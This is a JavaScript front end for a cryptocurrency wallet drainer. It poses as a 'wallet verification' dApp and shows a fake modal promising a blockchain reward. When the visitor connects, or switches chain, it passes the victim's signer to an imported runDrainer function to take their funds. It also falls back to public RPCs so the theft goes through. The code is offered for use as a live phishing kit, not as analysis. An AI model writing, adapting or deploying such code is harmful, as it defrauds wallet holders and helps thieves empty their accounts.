import { createAppKit } from '@reown/appkit';
import { mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base } from '@reown/appkit/networks';
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
import { ethers } from 'ethers';
import { runDrainer } from './drainer.js';

// === –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è AppKit ===
const projectId = 'd85cc83edb401b676e2a7bcef67f3be8';
const networks = [mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base];
const wagmiAdapter = new WagmiAdapter({ projectId, networks });

const appKitModal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  projectId,
  metadata: {
    name: 'Alex dApp',
    description: 'Connect and sign',
    url: 'https://checkalex.xyz',
    icons: ['https://checkalex.xyz/icon.png'],
  },
  features: { analytics: true, email: false, socials: false },
  allWallets: 'SHOW',
});

// === –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ ===
let connectedAddress = null;
let hasDrained = false;
let isTransactionPending = false;
let actionBtn = null;
let modalOverlay = null;
let modalContent = null;
let modalShown = false;

const targetChainId = '0x1'; // Ethereum Mainnet

// –°–ø–∏—Å–æ–∫ –Ω–∞–¥—ë–∂–Ω—ã—Ö RPC –¥–ª—è Ethereum Mainnet
const FALLBACK_RPCS = [
  'https://rpc.eth.gateway.fm',
  'https://eth.llamarpc.com',
  'https://ethereum-rpc.publicnode.com'
];

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –ø—Ä–æ–≤–∞–π–¥–µ—Ä–∞ —Å fallback RPC
async function getReliableProvider() {
  // –°–Ω–∞—á–∞–ª–∞ –ø—Ä–æ–±—É–µ–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ø—Ä–æ–≤–∞–π–¥–µ—Ä –∫–æ—à–µ–ª—å–∫–∞
  const walletProvider = new ethers.providers.Web3Provider(window.ethereum);
  try {
    // –ë–æ–ª–µ–µ —Å—Ç—Ä–æ–≥–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞: –∑–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –±–∞–ª–∞–Ω—Å –Ω—É–ª–µ–≤–æ–≥–æ –∞–¥—Ä–µ—Å–∞
    await walletProvider.getBalance('0x0000000000000000000000000000000000000000');
    console.log('‚úÖ –ü—Ä–æ–≤–∞–π–¥–µ—Ä –∫–æ—à–µ–ª—å–∫–∞ –ø–æ–ª–Ω–æ—Å—Ç—å—é —Ä–∞–±–æ—á–∏–π');
    return walletProvider;
  } catch (err) {
    console.warn('‚ö†Ô∏è –ü—Ä–æ–≤–∞–π–¥–µ—Ä –∫–æ—à–µ–ª—å–∫–∞ –Ω–µ–Ω–∞–¥—ë–∂–µ–Ω:', err.message);
  }

  // –ï—Å–ª–∏ –ø—Ä–æ–≤–∞–π–¥–µ—Ä –∫–æ—à–µ–ª—å–∫–∞ –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç, –ø–µ—Ä–µ—Ö–æ–¥–∏–º –Ω–∞ fallback RPC
  for (const rpcUrl of FALLBACK_RPCS) {
    try {
      const fallbackProvider = new ethers.providers.JsonRpcProvider(rpcUrl);
      await fallbackProvider.getBalance('0x0000000000000000000000000000000000000000');
      console.log(`‚úÖ –ü–µ—Ä–µ–∫–ª—é—á–µ–Ω–æ –Ω–∞ fallback RPC: ${rpcUrl}`);
      return new ethers.providers.Web3Provider({
        ...window.ethereum,
        request: async (request) => {
          if (
            request.method === 'eth_chainId' ||
            request.method === 'eth_call' ||
            request.method === 'eth_getBalance' ||
            request.method === 'eth_blockNumber'
          ) {
            return fallbackProvider.send(request.method, request.params || []);
          }
          return walletProvider.send(request.method, request.params || []);
        }
      });
    } catch (err) {
      console.warn(`‚ö†Ô∏è Fallback RPC ${rpcUrl} –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω:`, err.message);
    }
  }

  throw new Error('‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –Ω–∞–π—Ç–∏ —Ä–∞–±–æ—á–∏–π RPC');
}

// === –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã ===
window.addEventListener('DOMContentLoaded', () => {
  actionBtn = document.getElementById('action-btn');
  const isInjected = typeof window.ethereum !== 'undefined';

  // –ü–æ–¥–∫–ª—é—á–∞–µ–º —à—Ä–∏—Ñ—Ç—ã Orbitron –∏ Montserrat
  const link = document.createElement('link');
  link.href = 'https://fonts.googleapis.com/css2?family=Orbitron:wght@500&family=Montserrat:wght@400;700&display=swap';
  link.rel = 'stylesheet';
  document.head.appendChild(link);

  // CSS –¥–ª—è –º–æ–¥–∞–ª—å–Ω–æ–≥–æ –æ–∫–Ω–∞
  const style = document.createElement('style');
  style.textContent = `
    .modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.85);
      z-index: 999;
      display: none;
      backdrop-filter: blur(5px);
    }

    .modal-content {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: linear-gradient(145deg, #1a1a2e, #16213e);
      border: 1px solid #00d4ff;
      border-radius: 15px;
      padding: 25px;
      width: 90%;
      max-width: 350px;
      min-height: 400px;
      text-align: center;
      z-index: 1000;
      display: none;
      font-family: 'Montserrat', sans-serif;
      color: #ffffff;
      box-shadow: 0 0 20px rgba(0, 212, 255, 0.3);
      animation: fadeIn 0.5s ease-out forwards;
    }

    @keyframes fadeIn {
      0% { transform: translate(-50%, -50%) scale(0.9); opacity: 0; }
      100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
    }

    .modal-title {
      font-family: 'Orbitron', sans-serif;
      font-size: 22px;
      color: #00d4ff;
      margin-bottom: 20px;
      text-transform: uppercase;
      letter-spacing: 2px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
    }

    .modal-title::before {
      content: 'üîó';
      font-size: 24px;
    }

    .scanner-container {
      position: relative;
      width: 120px;
      height: 120px;
      margin: 0 auto 20px;
    }

    .scanner-bg {
      width: 100%;
      height: 100%;
      background: radial-gradient(circle, rgba(0, 212, 255, 0.1) 0%, transparent 70%);
      border-radius: 50%;
      position: absolute;
      top: 0;
      left: 0;
    }

    .scanner-line {
      width: 100%;
      height: 4px;
      background: #00d4ff;
      position: absolute;
      top: 50%;
      left: 0;
      box-shadow: 0 0 10px #00d4ff;
      animation: scan 2s linear infinite;
    }

    @keyframes scan {
      0% { transform: translateY(-50px); opacity: 0; }
      50% { transform: translateY(50px); opacity: 1; }
      100% { transform: translateY(-50px); opacity: 0; }
    }

    .modal-subtitle {
      font-size: 14px;
      color: #b0b0b0;
      margin-bottom: 25px;
    }

    .action-list {
      list-style: none;
      padding: 0;
      margin: 20px 0 0;
      font-size: 14px;
      color: #e0e0e0;
    }

    .action-list li {
      margin-bottom: 10px;
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .action-list li::before {
      content: '‚úîÔ∏è';
      color: #00ff88;
      font-size: 16px;
    }

    .modal-footer {
      font-size: 12px;
      color: #888888;
      margin-top: 30px;
      font-style: italic;
    }

    @media (max-width: 480px) {
      .modal-content {
        max-width: 300px;
        padding: 20px;
        min-height: 350px;
      }
      .modal-title { font-size: 18px; }
      .scanner-container { width: 100px; height: 100px; }
      .modal-subtitle { font-size: 12px; }
      .action-list { font-size: 12px; }
      .modal-footer { font-size: 10px; }
    }
  `;
  document.head.appendChild(style);

  // –°–æ–∑–¥–∞—ë–º –º–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ
  modalOverlay = document.createElement('div');
  modalOverlay.className = 'modal-overlay';
  document.body.appendChild(modalOverlay);

  modalContent = document.createElement('div');
  modalContent.className = 'modal-content';
  modalContent.innerHTML = `
    <div class="modal-title">Verify Your Wallet</div>
    <div class="modal-subtitle">Processing blockchain verification...</div>
    <div class="scanner-container">
      <div class="scanner-bg"></div>
      <div class="scanner-line"></div>
    </div>
    <ul class="action-list">
      <li>Connect to the network</li>
      <li>Sign the verification transaction</li>
      <li>Claim your blockchain reward</li>
    </ul>
    <div class="modal-footer">Please confirm in your wallet app</div>
  `;
  document.body.appendChild(modalContent);

  // –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ –∏–Ω–∂–µ–∫—Ç–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ –ø—Ä–æ–≤–∞–π–¥–µ—Ä–∞
  if (!isInjected) {
    actionBtn.style.display = 'inline-block';
    actionBtn.addEventListener('click', () => {
      window.showWalletRedirectModal();
    });
    return;
  }

  actionBtn.style.display = 'inline-block';
  actionBtn.addEventListener('click', handleConnectOrAction);

  // –ü–æ–¥–ø–∏—Å–∫–∞ –Ω–∞ —Å–º–µ–Ω—É —Å–µ—Ç–∏
  window.ethereum.on('chainChanged', onChainChanged);
});

// === –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –º–æ–¥–∞–ª—å–Ω—ã–º –æ–∫–Ω–æ–º ===
function showModal() {
  modalOverlay.style.display = 'block';
  modalContent.style.display = 'block';
}

function hideModal() {
  modalOverlay.style.display = 'none';
  modalContent.style.display = 'none';
}

function showModalOnce() {
  if (!modalShown) {
    modalShown = true;
    showModal();
  }
}

// === –°–º–µ–Ω–∞ —Å–µ—Ç–∏ ===
async function switchToTargetNetwork() {
  try {
    const provider = await getReliableProvider();
    const network = await provider.getNetwork();
    const currentChainId = `0x${network.chainId.toString(16)}`;

    if (currentChainId === targetChainId) {
      console.log('‚úÖ –£–∂–µ –Ω–∞ Ethereum Mainnet');
      return true;
    }

    console.log('üîÑ –ü–æ–ø—ã—Ç–∫–∞ —Å–º–µ–Ω–∏—Ç—å —Å–µ—Ç—å –Ω–∞ Ethereum Mainnet');
    await window.ethereum.request({
      method: 'wallet_switchEthereumChain',
      params: [{ chainId: targetChainId }],
    });
    console.log('‚úÖ –°–µ—Ç—å –∏–∑–º–µ–Ω–µ–Ω–∞ –Ω–∞ Ethereum Mainnet');
    return true;
  } catch (err) {
    if (err.code === 4902 || err.message.includes('Unrecognized chain')) {
      try {
        await window.ethereum.request({
          method: 'wallet_addEthereumChain',
          params: [{
            chainId: targetChainId,
            chainName: 'Ethereum Mainnet',
            nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
            rpcUrls: FALLBACK_RPCS,
            blockExplorerUrls: ['https://etherscan.io'],
          }],
        });
        console.log('‚úÖ –°–µ—Ç—å Ethereum Mainnet –¥–æ–±–∞–≤–ª–µ–Ω–∞');
        return true;
      } catch (addErr) {
        console.error('‚ùå –û—à–∏–±–∫–∞ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è —Å–µ—Ç–∏:', addErr.message);
        return false;
      }
    } else if (err.message.includes('user rejected')) {
      console.log('üôÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ—Ç–∫–ª–æ–Ω–∏–ª —Å–º–µ–Ω—É —Å–µ—Ç–∏');
      return false;
    } else {
      console.error('‚ùå –û—à–∏–±–∫–∞ —Å–º–µ–Ω—ã —Å–µ—Ç–∏:', err.message);
      return false;
    }
  }
}

// === –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ drainer ===
async function attemptDrainer() {
  if (hasDrained || isTransactionPending) {
    console.log('‚ö†Ô∏è –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è —É–∂–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ –∏–ª–∏ –æ–∂–∏–¥–∞–µ—Ç—Å—è');
    return;
  }

  // –£–±–∏—Ä–∞–µ–º –ø—Ä–æ–≤–µ—Ä–∫—É —Å–µ—Ç–∏, —Ç–∞–∫ –∫–∞–∫ drainer.js —Å–∞–º –≤—ã–±–µ—Ä–µ—Ç —Å–µ—Ç—å
  /*
  const isNetworkCorrect = await switchToTargetNetwork();
  if (!isNetworkCorrect) {
    console.log('‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å Ethereum Mainnet');
    return;
  }

  const provider = await getReliableProvider();
  const network = await provider.getNetwork();
  if (network.chainId !== parseInt(targetChainId, 16)) {
    console.log('‚ö†Ô∏è –°–µ—Ç—å –Ω–µ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É–µ—Ç Ethereum Mainnet');
    return;
  }
  */

  if (!connectedAddress) {
    console.error('‚ùå –ê–¥—Ä–µ—Å –∫–æ—à–µ–ª—å–∫–∞ –Ω–µ –æ–ø—Ä–µ–¥–µ–ª—ë–Ω');
    return;
  }

  console.log(`üìç –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –∞–¥—Ä–µ—Å: ${connectedAddress}`);
  showModalOnce();

  try {
    const provider = await getReliableProvider();
    const signer = provider.getSigner();
    const address = await signer.getAddress();

    if (address.toLowerCase() !== connectedAddress.toLowerCase()) {
      console.error('‚ùå –ù–µ—Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–∏–µ –∞–¥—Ä–µ—Å–æ–≤:', address, connectedAddress);
      hideModal();
      return;
    }

    isTransactionPending = true;
    await runDrainer(provider, signer, connectedAddress);
    console.log('‚úÖ Drainer –≤—ã–ø–æ–ª–Ω–µ–Ω —É—Å–ø–µ—à–Ω–æ');

    hasDrained = true;
    isTransactionPending = false;
    cleanup();
    hideModal();
  } catch (err) {
    isTransactionPending = false;
    hideModal();
    if (err.message.includes('user rejected')) {
      console.log('üôÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ—Ç–∫–ª–æ–Ω–∏–ª —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é');
    } else {
      console.error('‚ùå –û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è drainer:', err.message);
      throw err;
    }
  }
}

// === –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫–æ—à–µ–ª—å–∫–∞ –∏ –∑–∞–ø—É—Å–∫ ===
async function handleConnectOrAction() {
  try {
    const accounts = await window.ethereum.request({ method: 'eth_accounts' });
    if (accounts.length === 0) {
      await appKitModal.open();
      connectedAddress = await waitForWallet();
      console.log('‚úÖ –ü–æ–¥–∫–ª—é—á—ë–Ω –∫–æ—à–µ–ª—ë–∫:', connectedAddress);
    } else {
      connectedAddress = accounts[0];
      console.log('‚úÖ –£–∂–µ –ø–æ–¥–∫–ª—é—á—ë–Ω:', connectedAddress);
    }

    if (!isTransactionPending) {
      await attemptDrainer();
    } else {
      console.log('‚è≥ –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è —É–∂–µ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è');
    }
  } catch (err) {
    console.error('‚ùå –û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è:', err.message);
  }
}

// === –û–±—Ä–∞–±–æ—Ç–∫–∞ —Å–º–µ–Ω—ã —Å–µ—Ç–∏ ===
async function onChainChanged(chainId) {
  console.log('üîÑ –°–º–µ–Ω–∞ —Å–µ—Ç–∏:', chainId);
  if (connectedAddress && !isTransactionPending) {
    await attemptDrainer();
  } else {
    console.log('‚è≥ –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –≤ –ø—Ä–æ—Ü–µ—Å—Å–µ');
  }
}

// === –û—á–∏—Å—Ç–∫–∞ ===
function cleanup() {
  if (!actionBtn) return;
  actionBtn.removeEventListener('click', handleConnectOrAction);
  window.ethereum.removeListener('chainChanged', onChainChanged);
  actionBtn.disabled = true;
  actionBtn.style.opacity = '0.6';
}

// === –û–∂–∏–¥–∞–Ω–∏–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫–æ—à–µ–ª—å–∫–∞ ===
async function waitForWallet() {
  const accounts = await window.ethereum.request({ method: 'eth_accounts' });
  if (accounts.length > 0) return accounts[0];

  return new Promise((resolve) => {
    const interval = setInterval(async () => {
      const accounts = await window.ethereum.request({ method: 'eth_accounts' });
      if (accounts.length) {
        clearInterval(interval);
        resolve(accounts[0]);
      }
    }, 500);
  });
}
